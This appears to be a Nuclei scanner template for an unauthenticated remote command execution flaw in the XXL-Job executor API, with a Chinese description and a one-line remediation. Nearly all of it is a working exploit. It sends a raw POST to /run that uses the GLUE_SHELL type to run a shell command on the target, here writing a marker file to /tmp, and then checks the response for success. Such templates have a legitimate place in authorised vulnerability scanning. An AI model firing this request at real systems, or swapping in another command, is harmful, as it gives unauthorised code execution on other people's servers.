id: xxl-job-202-rce

info:
  name: XXL-Job API 未授权访问RCE
  author: wintry
  severity: critical
  description: 默认情况下XXL-JOB的API接口没有开启认证,未经授权的攻击者可以构造一个恶意请求,实现远程命令执行.
  remediation: 给API接口添加权限验证
  metadata:
    max-request: 2
  tags: xxljob

variables:
  randtime: '{{rand_int(111, 999)}}'
  randtime2: '{{rand_int(111, 999)}}'

http:
  - raw:
      - |
        POST /run HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: application/x-www-form-urlencoded


        {
          "jobId": 1,
          "executorHandler": "demoJobHandler",
          "executorParams": "demoJobHandler",
          "executorBlockStrategy": "COVER_EARLY",
          "executorTimeout": 0,
          "logId": 1,
          "logDateTime": {{randtime2}},
          "glueType": "GLUE_SHELL",
          "glueSource": "echo test123 > /tmp/233.txt",
          "glueUpdatetime": {{randtime}},
          "broadcastIndex": 0,
          "broadcastTotal": 0
        }
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{\"code\":200}"

      - type: status
        status:
          - 200